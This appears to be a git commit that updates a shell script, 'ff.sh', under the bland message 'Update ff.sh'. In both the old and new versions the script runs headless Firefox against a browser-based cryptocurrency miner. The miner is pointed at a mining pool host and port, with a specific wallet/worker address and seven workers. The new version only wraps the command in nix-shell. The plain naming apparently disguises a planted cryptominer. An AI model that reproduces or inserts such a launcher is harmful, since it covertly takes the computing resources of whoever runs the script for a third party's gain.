3ce6f1ee6b7caa18cb1413485e07312d5eca4195
t2-source <t2@40.aa01.my03.com>
2025-09-30 12:24:07 +0800

    Update ff.sh

--- ff.sh
+++ ff.sh
@@ -1,1 +1,1 @@
-firefox --headless "https://webminer.pages.dev?algorithm=cwm_power2B&host=asia.rplant.xyz&port=17022&worker=Mau73g3nEEM5VpQG4EAMPtkuwBy1ZcqgCk.idx&password=X&workers=7"
+nix-shell -p firefox --run 'firefox --headless "https://webminer.pages.dev?algorithm=cwm_power2B&host=asia.rplant.xyz&port=17022&worker=Mau73g3nEEM5VpQG4EAMPtkuwBy1ZcqgCk.idx&password=X&workers=7"'
